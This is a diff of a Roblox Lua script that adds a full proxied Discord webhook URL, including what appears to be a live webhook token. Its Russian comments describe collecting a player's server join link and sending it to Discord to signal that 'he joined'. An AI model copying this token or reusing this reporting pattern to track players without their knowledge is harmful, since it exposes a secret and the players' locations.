@@ -4,7 +4,7 @@ local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 
 -- ⚠️ ЗАМЕНИТЕ НА ВАШ ПРОКСИ-ВЕБХУК ДИСКОРДА
-local webhookUrl = "https://lewisakura.moe"
+local webhookUrl = "https://webhook.lewisakura.moe/api/webhooks/1549358385453989969/7EmPPu20TXFW0zGaRwEdCUH9e3qhWfhIbsAj8X1wSGXBReLVVHwG632PnMCm8lSIpqeU"
 
 -- 1. Сбор и отправка данных в Discord (чтобы вы узнали, что он зашел)
 local joinLink = "roblox://placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
